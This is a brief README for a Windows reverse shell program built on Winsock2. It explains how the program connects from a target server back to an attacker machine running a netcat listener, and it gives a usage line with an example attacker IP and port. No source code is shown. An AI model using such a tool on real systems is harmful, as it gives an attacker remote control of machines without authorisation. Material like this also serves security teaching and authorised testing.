# Basic-Reverse-shell
A basic reverse shell on Windows using socket programming with Win32 API. It is used Winsock2 DLL to create socket and make a reverse connection from server to attacker machine. Make sure to change the attacker IP, port and turn on netcat listener before run it on target server

Usage:
```ReverseShell.exe <attacker's IP> <port>
Example:
```ReverseShell.exe 192.168.1.10 7777```
